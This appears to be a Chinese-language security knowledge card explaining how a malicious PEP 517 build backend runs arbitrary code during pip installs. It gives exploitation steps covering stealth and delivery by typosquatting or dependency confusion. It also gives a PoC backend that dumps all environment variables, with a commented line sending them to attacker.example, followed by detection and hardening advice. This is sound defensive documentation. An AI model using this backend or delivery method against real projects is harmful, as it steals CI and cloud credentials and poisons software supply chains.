---
id: cloud-cicd-pep517-build-backend-install-rce
title: 恶意 PEP 517 构建后端在 pip 安装期执行任意代码
type: scenario
domain: cloud
path: cloud/ci-cd
technique: pep517-build-backend-install-rce
aliases:
- PEP 517 构建后端 RCE
- pyproject build-backend
- pip 安装期代码执行
- Python 供应链投毒
- backend-path 滥用
tags:
- pep517
- python
- pip
- supply-chain
- build-backend
- pyproject
- ci-cd
- rce
- dependency-install
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V3
  verified_at: '2026-11-04T21:37:33+08:00'
  notes: 已对照原文与 18 张图片核对：build-backend/backend-path 三个钩子调用、hook_trace 的 pid/cwd/python/config_settings、--no-build-isolation 仍执行后端、直接装 wheel 无钩子、sdist+--no-clean 保留 pip-req-build-*、-C 参数进入钩子，均与截图一致；Python 3.13.12/pip 26.0.1 仅为实验环境，非受影响版本；PoC 未执行。
---

## 一句话结论

当受害者用 pip 安装攻击者可控的 Python 源码包、源码路径或 sdist 时，`pyproject.toml` 里的 `build-backend` 与 `backend-path` 会让 pip 在构建阶段导入并调用攻击者的 Python 模块；`prepare_metadata_for_build_wheel`、`build_wheel` 等钩子在包安装完成之前就以构建用户权限执行任意代码，可读取环境变量、CI 凭据和本地文件。

## 原理

- pip 安装源码包（本地路径、sdist、无可用 wheel 的依赖）时，不能直接复制文件，必须先把源码构建成 wheel。PEP 517 规定这个构建过程由 `[build-system]` 指定的构建后端完成。
- 构建后端是一个普通 Python 模块。pip 会把它加入导入路径（`backend-path` 指定的目录）、导入模块，并调用约定钩子：`get_requires_for_build_wheel`、`prepare_metadata_for_build_wheel`、`build_wheel`。
- 这些钩子运行在构建进程里，拥有当前用户的 Python 执行权限。它们可以读取源码、环境变量、`config_settings`、构建环境已安装的包、当前用户可读写的文件，也可以调用编译器、解释器和系统命令。
- `prepare_metadata_for_build_wheel` 发生在“获取包名/版本/依赖”的元数据阶段，常被误认为只是读取静态配置；实际上此时后端代码已经运行。`build_wheel` 只是后续的第二次执行机会。
- `--no-build-isolation` 不是安全开关：它只是不创建隔离构建环境，后端代码仍在当前 Python 环境中运行，反而可能接触到更多已安装包和凭据。
- `--no-deps` 只跳过依赖安装，不跳过当前目标包的构建；`pip wheel` 虽然不安装包，但本身就是构建动作；只要输入是源码，后端就会运行。
- 直接安装已构建好的 wheel 不会回到源码后端；但 wheel 内的包代码、入口脚本和元数据仍然需要信任。PEP 517 这条路径只说明“源码构建阶段”的代码执行。
- 根因是协议设计：构建后端本来就是“安装期执行的代码”，信任边界应从运行时代码扩展到构建代码与构建依赖。

## 触发条件

- 受害者执行 `pip install` 安装攻击者可控的源码包、源码路径或 `.tar.gz` sdist，或安装一个只能从源码构建的依赖。
- 项目的 `pyproject.toml` 指定了攻击者的 `build-backend`，并通过 `backend-path` 指向随源码提交的模块目录；或 `[build-system].requires` 拉取了攻击者可控/被替换的构建依赖。
- 安装链路没有强制 `--only-binary=:all:` 与哈希锁定，允许回退到源码构建。
- 构建环境（CI runner、开发机、发布机）注入了有价值的凭据：发布令牌、私有源认证、云临时凭据、SSH 密钥、代理配置等。
- 构建用户对目标文件/网络有权限。

## 利用步骤

1. 构造恶意源码包：`pyproject.toml` 写 `build-backend = "evil_backend"`、`backend-path = ["build_backend"]`，并把 `build_backend/evil_backend.py` 随包提交。
2. 在 `evil_backend.py` 的 `prepare_metadata_for_build_wheel` 或 `build_wheel` 中放入任意 Python 代码：读取 `os.environ`、遍历文件、发起网络请求、写入 marker，或修改生成的 wheel。
3. 同时实现最小合法元数据/wheel 生成逻辑，确保安装继续成功，避免受害者察觉。
4. 通过公共索引、内部镜像、依赖混淆、typosquatting、PR 投毒或直接投递 sdist 让受害者安装。
5. 后端钩子在 `pip install`/`pip wheel` 的构建阶段执行；代码在包安装完成前已获得构建用户权限。
6. 用 `--no-clean` 可保留 `pip-req-build-*` 临时目录和钩子记录用于取证（攻击者也可借此确认命中）。

## PoC

```toml
# pyproject.toml
[build-system]
requires = []
build-backend = "evil_backend"
backend-path = ["build_backend"]
```

```python
# build_backend/evil_backend.py
import os, json, pathlib, urllib.request

def _run():
    data = {
        "cwd": os.getcwd(),
        "env": dict(os.environ),          # CI 令牌、云凭据、代理配置等
        "user": os.getuid() if hasattr(os, "getuid") else None,
    }
    # 演示：写到本地 marker；真实攻击可外带到攻击者服务
    pathlib.Path("hook_trace.jsonl").write_text(json.dumps(data), encoding="utf-8")
    # urllib.request.urlopen("https://attacker.example/collect", data=...)

def get_requires_for_build_wheel(config_settings=None):
    _run()
    return []

def prepare_metadata_for_build_wheel(metadata_directory, config_settings=None):
    _run()
    dist = pathlib.Path(metadata_directory) / "evil_pkg-0.1.0.dist-info"
    dist.mkdir(parents=True, exist_ok=True)
    (dist / "METADATA").write_text(
        "Metadata-Version: 2.1\nName: evil-pkg\nVersion: 0.1.0\n\n", encoding="utf-8")
    (dist / "WHEEL").write_text(
        "Wheel-Version: 1.0\nGenerator: evil\nRoot-Is-Purelib: true\nTag: py3-none-any\n\n",
        encoding="utf-8")
    return dist.name

def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    _run()
    import zipfile
    name = "evil_pkg-0.1.0-py3-none-any.whl"
    with zipfile.ZipFile(pathlib.Path(wheel_directory) / name, "w") as z:
        z.writestr("evil_pkg/__init__.py", "VALUE = 'pwned'\n")
    return name
```

```bash
# 受害者侧：源码安装触发后端钩子
python3 -m pip install --no-build-isolation .
# 或
python3 -m pip install ./evil-pkg-0.1.0.tar.gz
# 观察
cat hook_trace.jsonl
```

## 变体与关联

- 不用 `backend-path` 也可以：`[build-system].requires = ["custom-build-core"]` + `build-backend = "custom_build_core.backend"`，让 pip 先安装攻击者可控的构建依赖，再导入其后端；构建依赖执行得更早，接触构建环境也更早。
- `pip wheel .` 不安装包，但仍会构建并运行后端；`--no-deps` 不跳过目标包构建；`--no-build-isolation` 只是改变构建环境隔离。
- 已构建好的 wheel 直接安装不会调用源码后端；但恶意 wheel 仍可在包导入、入口脚本、安装钩子中执行代码，不能据此认为 wheel 安全。
- `-C key=value`/`--config-settings` 会把参数传入后端钩子，可作为攻击者控制构建行为的通道，也可用于识别构建环境。
- 关联：与运行期依赖漏洞、wheel 内容投毒属于不同阶段；本卡关注“源码构建期后端代码执行”，审查时应把构建依赖也纳入供应链边界。

## 检测与防御

- 审查：安装前检查 `pyproject.toml` 的 `[build-system]`（`build-backend`、`backend-path`、`requires`）、`setup.py`、`setup.cfg`、`MANIFEST.in`；`backend-path` 指向源码内自定义模块的项目要重点看该模块。
- 审查：构建依赖是否来自可信索引、版本是否固定、是否可能被内部镜像/依赖混淆替换；`requirements.txt` 只描述运行依赖，不能替代构建依赖审查。
- 安装策略：业务环境使用 `pip install --only-binary=:all: --require-hashes -r requirements.txt`，强制使用已审查、哈希锁定的 wheel，避免安装期临时源码构建。
- 环境隔离：源码构建放在低权限、一次性、无生产凭据的构建环境中；构建任务只注入必需凭据，发布令牌/云凭据/长期私钥不进入普通依赖构建。
- 检测：`pip -v` 日志中出现 `Preparing metadata (pyproject.toml)`、`Building wheel`、`Running command ... backend`；构建目录出现非预期 `hook_trace`/网络请求；CI 中出现构建进程读取敏感环境变量或访问 metadata 服务。
- 加固：固定构建后端与构建依赖版本；使用内部可信 wheel 仓库；对 sdist 做人工/自动化审查；构建产物与源码构建环境分离。
